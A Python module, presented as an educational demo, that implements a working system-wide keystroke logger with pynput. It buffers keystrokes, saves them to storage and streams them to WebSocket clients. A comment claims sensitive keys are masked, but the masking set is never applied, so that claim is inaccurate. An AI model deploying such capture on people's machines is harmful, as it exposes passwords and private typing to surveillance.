"""
logger.py  –  Real-time keystroke capture using pynput
=======================================================
Educational Keystroke Logger Demo – DO NOT USE MALICIOUSLY

The KeystrokeLogger class wraps pynput.keyboard.Listener.
It runs ONLY when explicitly started via start() and stops cleanly via stop().
All captures are broadcast to registered async queues (for WebSocket clients)
and optionally persisted to encrypted storage.
"""

import asyncio
import time
from typing import Any, Callable, Dict, List, Optional

from pynput import keyboard

# ---------------------------------------------------------------------------
# Keys that are considered "sensitive" – we mask them in the log
# These are common password-input control sequences.
# ---------------------------------------------------------------------------
_SENSITIVE_SPECIAL_KEYS = {
    keyboard.Key.backspace,
    keyboard.Key.delete,
    keyboard.Key.enter,
    keyboard.Key.tab,
}

# Label map for common special keys (makes logs human-readable)
_KEY_LABELS: Dict[Any, str] = {
    keyboard.Key.space:     "[SPACE]",
    keyboard.Key.enter:     "[ENTER]",
    keyboard.Key.backspace: "[BKSP]",
    keyboard.Key.tab:       "[TAB]",
    keyboard.Key.shift:     "[SHIFT]",
    keyboard.Key.shift_r:   "[SHIFT]",
    keyboard.Key.ctrl_l:    "[CTRL]",
    keyboard.Key.ctrl_r:    "[CTRL]",
    keyboard.Key.alt_l:     "[ALT]",
    keyboard.Key.alt_r:     "[ALT]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.esc:       "[ESC]",
    keyboard.Key.delete:    "[DEL]",
    keyboard.Key.up:        "[↑]",
    keyboard.Key.down:      "[↓]",
    keyboard.Key.left:      "[←]",
    keyboard.Key.right:     "[→]",
    keyboard.Key.f1:        "[F1]",  keyboard.Key.f2: "[F2]",
    keyboard.Key.f3:        "[F3]",  keyboard.Key.f4: "[F4]",
    keyboard.Key.f5:        "[F5]",  keyboard.Key.f6: "[F6]",
    keyboard.Key.f7:        "[F7]",  keyboard.Key.f8: "[F8]",
    keyboard.Key.f9:        "[F9]",  keyboard.Key.f10: "[F10]",
    keyboard.Key.f11:       "[F11]", keyboard.Key.f12: "[F12]",
}


class KeystrokeLogger:
    """
    Thread-safe keystroke logger backed by pynput.

    Usage:
        logger = KeystrokeLogger(on_keystroke_callback, persist=True)
        logger.start()
        # ... later ...
        logger.stop()
    """

    def __init__(
        self,
        on_keystroke: Optional[Callable[[Dict[str, Any]], None]] = None,
        persist: bool = True,
    ):
        """
        Parameters
        ----------
        on_keystroke : callable, optional
            Synchronous callback invoked with each keystroke record dict.
        persist : bool
            Whether to write keystrokes to encrypted storage.
        """
        self._on_keystroke = on_keystroke
        self._persist      = persist
        self._listener: Optional[keyboard.Listener] = None
        self._running  = False

        # In-memory ring-buffer of the last 500 keystrokes (for live feed)
        self._buffer: List[Dict[str, Any]] = []
        self._buffer_max = 500

        # Async event queues – one per connected WebSocket client
        self._queues: List[asyncio.Queue] = []

        # Stats
        self.total_count   = 0
        self._session_start: Optional[float] = None

    # ------------------------------------------------------------------
    # Public interface
    # ------------------------------------------------------------------

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def kpm(self) -> float:
        """Keystrokes per minute for the current live session."""
        if self._session_start is None or self.total_count == 0:
            return 0.0
        elapsed_min = (time.time() - self._session_start) / 60
        return round(self.total_count / elapsed_min, 2) if elapsed_min > 0 else 0.0

    def start(self) -> None:
        """Begin listening for keystrokes (explicit user action required)."""
        if self._running:
            return
        self._running       = True
        self._session_start = time.time()
        self._listener      = keyboard.Listener(on_press=self._on_press)
        self._listener.start()

    def stop(self) -> None:
        """Stop the listener cleanly."""
        self._running = False
        if self._listener:
            self._listener.stop()
            self._listener = None

    def reset(self) -> None:
        """Stop logging and clear the in-memory buffer + counters."""
        self.stop()
        self._buffer       = []
        self.total_count   = 0
        self._session_start = None

    def get_buffer(self) -> List[Dict[str, Any]]:
        """Return a copy of the in-memory keystroke buffer."""
        return list(self._buffer)

    def subscribe(self, queue: asyncio.Queue) -> None:
        """Register an asyncio Queue; each new keystroke will be put() into it."""
        self._queues.append(queue)

    def unsubscribe(self, queue: asyncio.Queue) -> None:
        """Remove a previously registered queue."""
        try:
            self._queues.remove(queue)
        except ValueError:
            pass

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _on_press(self, key: Any) -> None:
        """pynput callback – runs in pynput's thread."""
        if not self._running:
            return

        is_special = isinstance(key, keyboard.Key)
        label: str

        if is_special:
            label = _KEY_LABELS.get(key, f"[{key.name.upper()}]")
        else:
            try:
                label = key.char if key.char else "?"
            except AttributeError:
                label = "?"

        record: Dict[str, Any] = {
            "key":        label,
            "timestamp":  time.time(),
            "is_special": is_special,
        }

        # Update ring buffer
        self._buffer.append(record)
        if len(self._buffer) > self._buffer_max:
            self._buffer.pop(0)

        self.total_count += 1

        # Persist to encrypted file
        if self._persist:
            try:
                from storage import append_keystroke
                append_keystroke(record)
            except Exception:
                pass

        # Invoke sync callback
        if self._on_keystroke:
            try:
                self._on_keystroke(record)
            except Exception:
                pass

        # Push to all WebSocket queues (thread-safe via call_soon_threadsafe)
        for q in list(self._queues):
            try:
                loop = asyncio.get_event_loop()
                loop.call_soon_threadsafe(q.put_nowait, record)
            except Exception:
                pass
